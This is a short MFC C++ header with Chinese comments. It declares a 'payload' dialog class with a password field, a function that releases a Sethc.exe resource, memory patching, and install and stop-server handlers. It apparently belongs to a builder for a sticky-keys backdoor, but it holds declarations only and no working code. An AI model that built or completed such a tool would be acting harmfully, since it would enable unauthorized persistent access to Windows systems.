
// PayLoadDlg.h : 头文件
//

#pragma once


// CPayLoadDlg 对话框
class CPayLoadDlg : public CDialog
{
// 构造
public:
	CPayLoadDlg(CWnd* pParent = NULL);	// 标准构造函数

// 对话框数据
	enum { IDD = IDD_PAYLOAD_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnBnClickedBtnCreate();
	afx_msg void OnEnChangeEditPassword();
	CString m_strPwd;  //密码
	bool ReleaseSethc();  //释放Sethc.exe资源
	CString GetCurDir() const;
	bool FindMem(IN TCHAR* pMem, IN const int nLen, IN TCHAR* pFrom, IN TCHAR* pTo);
	afx_msg void OnBnClickedBtnInstall();
	void StopServer();
	virtual BOOL PreTranslateMessage(MSG* pMsg);
};
